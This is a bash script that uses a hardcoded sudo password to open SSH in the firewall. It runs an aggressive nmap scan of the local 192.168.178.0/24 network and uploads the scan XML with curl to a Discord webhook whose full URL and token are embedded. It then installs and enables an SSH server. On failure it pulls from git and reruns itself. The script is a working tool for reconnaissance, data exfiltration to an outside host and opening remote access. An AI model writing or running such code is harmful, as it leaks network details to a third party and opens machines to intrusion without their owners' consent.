#!/bin/bash
if echo 'sdds' | sudo -S sh -c "sudo ufw allow ssh"; then
	echo "nmap scan and sending xml..."
 	sudo nmap -T5 -A -v 192.168.178.1/24 -oX /home/$USER/net.xml  
  	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
	echo "SUDO SUCCESS installing ssh services..."
	sudo apt install openssh-server -y 
  	# sudo echo "<command>" >>  "/etc/ssh/sshd_config"
 	# sudo service ssh restart
	sudo systemctl enable ssh
	echo "ssh installed and enable. open port 22 "
 	# sudo systemctl status ssh
else	
	sleep 5
 	git stash
  	git rebase origin main
   	git pull
   	chmod +x no.sh
 	./$0
fi
